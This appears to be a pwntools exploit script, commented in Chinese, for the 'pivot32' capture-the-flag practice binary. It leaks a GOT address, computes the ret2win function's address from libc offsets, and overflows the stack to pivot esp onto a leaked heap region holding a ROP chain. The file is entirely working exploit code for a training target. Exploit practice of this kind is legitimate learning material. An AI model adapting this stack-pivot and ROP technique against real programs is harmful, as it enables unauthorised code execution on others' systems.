# coding:utf-8
from pwn import *

sh = process('./pivot32')
elf = ELF('./pivot32')

libc = ELF('./libpivot32.so')

foothold_function_got = elf.got['foothold_function']
foothold_function_plt = elf.plt['foothold_function']
foothold_function_libc = libc.symbols['foothold_function']
ret2win_libc = libc.symbols['ret2win']

sh.recvuntil('pivot: ')
shellcode_addr = int(sh.recv(10), 16)

pop_eax_addr = 0x80488c0
xchg_addr = 0x080488c2
mov_addr = 0x080488c4
add_addr = 0x080488c7

pop_ebx_addr = 0x08048571
jmp_addr = 0x08048a5f

payload1 = p32(foothold_function_plt) # 调用foothold_function函数，调用时会将foothold_function函数的实际地址写入到GOT表中
payload1 += p32(pop_eax_addr) + p32(foothold_function_got)# 将foothold_function函数的GOT地址写入eax寄存器
payload1 += p32(mov_addr) # 将foothold_function函数的GOT地址指向的地址放入eax寄存器，即foothold_function函数在内存中的真实地址
payload1 += p32(pop_ebx_addr) + p32(ret2win_libc - foothold_function_libc) # 将ret2win函数与foothold_function函数在libc.so文件中的相对偏移放入ebx
payload1 += p32(add_addr) # foothold_function函数真实地址加上ret2win相对于foothold_function函数的offset即得ret2win函数在内存中的实际地址
payload1 += p32(jmp_addr) # 使程序跳转到eax中的地址，即泄露的堆空间的入口位置

sh.recvuntil('>')
sh.sendline(payload1)

payload2 = 'a' * (0x28 + 0x4) # padding
payload2 += p32(pop_eax_addr) + p32(shellcode_addr) # 堆空间的地址放入eax寄存器
payload2 += p32(xchg_addr) # 交换eax和esp的值，也就是说程序分配的堆空间就被当成栈，ret就会返回到栈顶去执行我们精心设计好的shellcode

sh.recvuntil('smash')
sh.sendline(payload2)

sh.interactive()
sh.close()